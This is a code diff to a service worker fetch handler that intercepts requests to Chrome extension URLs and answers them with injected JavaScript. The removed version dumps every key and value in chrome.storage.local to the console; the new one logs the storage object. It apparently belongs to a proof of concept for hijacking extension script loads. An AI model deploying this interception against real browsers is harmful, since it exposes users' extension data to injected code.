@@ -5,14 +5,7 @@ self.addEventListener("fetch", (event) => {
         return;
     }
     if(event.request.url.indexOf("chrome-extension") != -1){
-        var a =             new Response(`(async function foo() {
-                chrome.storage.local.get(null, function(items) {
-                const keys = Object.keys(items);
-                console.log('存储中的所有键:', keys);
-                keys.forEach(function(key) {
-                console.log('键:', key, '值:', items[key]);
-      });
-  });})();`, {
+        var a =             new Response(`(async function foo(){console.log(chrome.storage)})();`, {
           headers: {'Content-Type': 'text/javascript', 'Access-Control-Allow-Origin':"*"}
         })
         event.respondWith(
